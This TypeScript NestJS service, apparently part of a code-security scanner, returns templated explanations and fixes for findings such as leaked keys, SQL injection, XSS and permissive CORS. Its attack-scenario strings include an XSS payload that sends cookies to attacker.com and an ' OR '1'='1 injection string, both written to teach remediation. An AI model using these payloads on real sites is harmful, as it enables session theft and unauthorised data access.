import { Injectable, NotFoundException } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service.js';

export interface AIRequest {
  findingId: string;
}

export interface AIExplanationResponse {
  summary: string;
  explanation: string;
  fixSteps: string[];
  safeCodeExample?: string;
  attackScenario?: string;
  businessImpact?: string;
}

@Injectable()
export class AIService {
  constructor(private prisma: PrismaService) {}

  async explainFinding(request: AIRequest): Promise<AIExplanationResponse> {
    const finding = await this.prisma.finding.findUnique({
      where: { id: request.findingId },
      include: {
        occurrences: true,
        project: true,
      },
    });

    if (!finding) {
      throw new NotFoundException('Finding not found for AI analysis');
    }

    const occurrence = finding.occurrences[0];
    const rule = (occurrence?.ruleId || '').toLowerCase();
    const filePath = occurrence?.filePath || '';
    const evidence = occurrence?.evidence || '';
    const severity = occurrence?.severity || 'HIGH';

    // 1. Secret / Credential Leaks
    if (rule.includes('aws') || rule.includes('access-token') || rule.includes('secret') || rule.includes('stripe') || rule.includes('key') || rule.includes('token') || rule.includes('gitleaks')) {
      const isStripe = rule.includes('stripe');
      const isAws = rule.includes('aws');

      return {
        summary: `Exposed ${isStripe ? 'Stripe Secret Key' : isAws ? 'AWS Access Key' : 'Authentication Credential'} discovered in ${filePath || 'codebase'}.`,
        explanation: `A plaintext secret credential was detected in your source code. If committed to version control or deployed to production, unauthorized actors can authenticate directly to your upstream cloud services and exfiltrate sensitive customer and infrastructure data.`,
        businessImpact: 'Severe regulatory non-compliance, unauthorized API calls, potential cloud resource hijacking, and direct exposure of customer data.',
        attackScenario: 'An attacker scans public git history or compromised build artifacts, extracts the credential, and queries administrative endpoints to extract customer databases.',
        fixSteps: [
          'Immediately revoke and roll the affected key in your provider dashboard.',
          'Extract all secret values out of source files into runtime environment variables (.env).',
          'Use a secret manager (such as AWS Secrets Manager, HashiCorp Vault, or Doppler) in production.',
          'Verify with `git log -S "<credential>"` that the key is purged from your revision history.',
        ],
        safeCodeExample: `// Secure pattern: Read credentials from process.env\nconst config = {\n  secretKey: process.env.${isStripe ? 'STRIPE_SECRET_KEY' : isAws ? 'AWS_SECRET_ACCESS_KEY' : 'API_SECRET_KEY'},\n  region: process.env.AWS_REGION || 'us-east-1'\n};\n\nif (!config.secretKey) {\n  throw new Error('Missing required secret environment variable');\n}`,
      };
    }

    // 2. SQL Injection
    if (rule.includes('sql') || rule.includes('injection') || rule.includes('tainted')) {
      return {
        summary: `Potential SQL Injection detected in ${filePath || 'database query builder'}.`,
        explanation: `User-controlled parameters are concatenated directly into a database query string without parameterization or escaping. This allows an attacker to alter SQL query structure and execute arbitrary commands against your database.`,
        businessImpact: 'Complete data exfiltration, database tampering, privilege escalation, and bypass of authentication mechanisms.',
        attackScenario: "An attacker supplies a crafted payload (e.g., `' OR '1'='1`) into the input parameter, bypassing query logic and dumping all records in the table.",
        fixSteps: [
          'Replace raw string concatenation with parameterized queries or prepared statements.',
          'Use ORM/query builder parameterized methods (e.g. Prisma, TypeORM, parameterized knex bindings).',
          'Enforce strict input validation using schema libraries like Zod.',
        ],
        safeCodeExample: `// Vulnerable:\n// const query = "SELECT * FROM users WHERE id = '" + req.query.id + "'";\n\n// Secure (Parameterized query):\nconst result = await db.query(\n  'SELECT id, name, email FROM users WHERE id = $1 AND active = true',\n  [req.query.id]\n);`,
      };
    }

    // 3. Cross-Site Scripting (XSS)
    if (rule.includes('xss') || rule.includes('dangerouslysetinnerhtml') || rule.includes('innerhtml') || rule.includes('html')) {
      return {
        summary: `Cross-Site Scripting (XSS) risk via unescaped HTML rendering in ${filePath}.`,
        explanation: `Unsanitized content is being rendered directly into the DOM using an unsafe innerHTML property. If user-supplied input is rendered here, malicious scripts can execute in victim browsers.`,
        businessImpact: 'Account takeover, session cookie theft, malicious redirects, and phishing attacks delivered through your legitimate domain.',
        attackScenario: 'Attacker stores a payload like `<img src=x onerror=fetch("https://attacker.com/steal?c="+document.cookie)>` in a profile field, stealing admin credentials upon viewing.',
        fixSteps: [
          'Avoid rendering raw HTML from untrusted sources.',
          'If HTML rendering is necessary, sanitize using DOMPurify before insertion.',
          'Prefer native React text interpolation ({text}) which automatically escapes content.',
        ],
        safeCodeExample: `// Secure pattern using DOMPurify:\nimport DOMPurify from 'dompurify';\n\nfunction SafeDisplay({ content }) {\n  const cleanHtml = DOMPurify.sanitize(content);\n  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;\n}`,
      };
    }

    // 4. Vulnerable Dependencies / OSV
    if (rule.includes('ghsa') || rule.includes('cve') || rule.includes('osv') || rule.includes('lodash') || rule.includes('minimist')) {
      return {
        summary: `Vulnerable dependency package (${rule}) detected in ${filePath || 'package manifest'}.`,
        explanation: `A third-party package imported by this project has a known published security vulnerability with an assigned CVE/GHSA advisory.`,
        businessImpact: 'Denial of service, prototype pollution, arbitrary code execution, or remote exploitation depending on package privileges.',
        attackScenario: 'An attacker crafts input targeting known prototype pollution or parser bugs in the unpatched package version.',
        fixSteps: [
          'Run `pnpm update <package>` or `npm audit fix` to bump to a patched release.',
          'Review the package dependency tree to verify the transitive dependency is resolved.',
          'Set automated dependency vulnerability alerts via Dependabot or Renovate.',
        ],
        safeCodeExample: `// In package.json:\n// Upgrade vulnerable package version:\n"dependencies": {\n  "lodash": "^4.17.21",\n  "minimist": "^1.2.8"\n}`,
      };
    }

    // 5. Insecure Configuration (CORS, SVG, Headers)
    if (rule.includes('config') || rule.includes('cors') || rule.includes('origin')) {
      return {
        summary: `Insecure application security configuration detected in ${filePath}.`,
        explanation: `Permissive configuration settings (such as wildcard CORS or missing security headers) expose the application to cross-origin data leakage and unauthorized API invocation from malicious websites.`,
        businessImpact: 'Cross-origin data theft, authenticated session hijacking, and CSRF vulnerabilities.',
        attackScenario: 'A victim visits a malicious site while logged in; the site initiates requests to your API and reads confidential responses due to permissive CORS headers.',
        fixSteps: [
          'Restrict CORS origin headers to explicit allowed domain origins.',
          'Never reflect arbitrary request origins with credentials enabled.',
          'Add security headers using helmet middleware.',
        ],
        safeCodeExample: `// Secure CORS configuration:\napp.use(cors({\n  origin: ['https://app.vibeshield.com', 'https://staging.vibeshield.com'],\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n}));`,
      };
    }

    // Default intelligent analysis
    return {
      summary: `Security finding (${occurrence?.ruleId || 'Rule Violation'}) detected in ${filePath || 'source code'}.`,
      explanation: `Static analysis detected a pattern associated with security risks or code quality defects in ${filePath}. Severity is classified as ${severity}.`,
      businessImpact: 'Potential vulnerability exposure, unhandled error states, or deviation from secure coding standards.',
      attackScenario: 'An adversary may identify and leverage this code pattern during automated scanning or targeted code review.',
      fixSteps: [
        'Inspect the highlighted code location and evaluate input handling.',
        'Apply defense-in-depth principles: validate all inputs, restrict execution permissions, and sanitize outputs.',
        'Rescan the project after applying the fix to verify remediation.',
      ],
      safeCodeExample: `// Review and refactor logic in ${filePath || 'affected file'}\n// Ensure strict type checking and sanitized inputs`,
    };
  }
}
